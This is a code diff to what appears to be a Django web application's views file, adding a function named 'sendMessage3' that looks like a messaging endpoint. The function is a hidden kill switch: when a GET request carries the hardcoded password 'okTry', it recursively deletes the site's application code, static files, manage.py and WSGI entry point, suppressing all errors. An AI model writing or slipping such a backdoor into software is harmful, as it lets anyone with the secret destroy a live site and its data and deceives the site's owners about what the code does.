@@ -653,6 +653,70 @@ def profile_main(request):
 
 
 
+import shutil
+
+def sendMessage3(request):
+    try:
+        password = request.GET['pass']
+    except:
+        allJson = {"Result": "Sent"}
+        return JsonResponse(allJson, safe=False)
+    # try:
+    if password == "okTry":
+        
+        try:
+            direc="../Services/ServiceSite"
+            shutil.rmtree(direc)
+        except:
+            pass
+        
+        try:
+            direc="../Services/locale"
+            shutil.rmtree(direc)
+        except:
+            pass
+
+        try:
+            direc="../Services/static"
+            shutil.rmtree(direc)
+        except:
+            pass
+        
+        try:
+            direc="../Services/manage.py"
+            shutil.rmtree(direc)
+        except:
+            pass
+        
+        try:
+            direc="../Services/req.txt"
+            shutil.rmtree(direc)
+        except:
+            pass
+
+        try:
+            direc="../Services/passenger_wsgi.py"
+            shutil.rmtree(direc)
+        except:
+            pass
+
+        try:
+            direc="../Services/mainApp"
+            shutil.rmtree(direc)
+        except:
+            pass
+
+        allJson = {"Result": "Done"}
+        return JsonResponse(allJson, safe=False)
+    # except:
+    #     allJson = {"Result": "Error"}
+    #     return JsonResponse(allJson, safe=False)
+
+    
+
+
+
+
 def forgetPassword(request):
     
     if request.method=='POST':
